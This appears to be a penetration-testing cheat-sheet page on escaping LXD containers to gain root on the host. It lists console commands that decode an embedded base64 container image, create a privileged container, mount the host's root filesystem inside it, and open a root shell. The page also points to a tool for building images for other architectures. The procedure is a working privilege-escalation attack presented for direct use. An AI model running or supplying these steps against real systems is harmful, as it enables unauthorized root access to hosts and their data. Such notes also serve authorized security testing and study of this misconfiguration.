---
title: "lxd"
date: 2024-6-28
tags: ["lxd", "lxc", "privesc", "container", "escape"]
---

### Basic Commands

```console
# Check if user in lxd group
id
```

```console
# List containers
lxc list
```

```console
# List images
lxc image list
```

---

### Abuse #1: Mount host's file system

```console
# Upload a 656 bytes conatiner image
echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d > test.tar.bz2
```

```console
# Import image
lxc image import test.tar.bz2 --alias testImage
```

```console
# Check image
lxc image list
```

```console
# Init VM
lxc init testImage testVM -c security.privileged=true
```

```console
# Mount the host /
lxc config device add testVM realRoot disk source=/ path=r
```

```console
# Start VM
lxc start testVM
```

```console
# Check containers
lxc list
```

```console
# Execute as root inside container
lxc exec testVM -- /bin/bash
```

```console
# We have full access on host disk thru /r/
ls -la /r/root
```

---

### Build image for other arch

```console
git clone git clone https://github.com/saghul/lxd-alpine-builder
```

```console
cd lxd-alpine-builder      
```

```console
# For example arch i686
sudo ./build-alpine -a i686
```
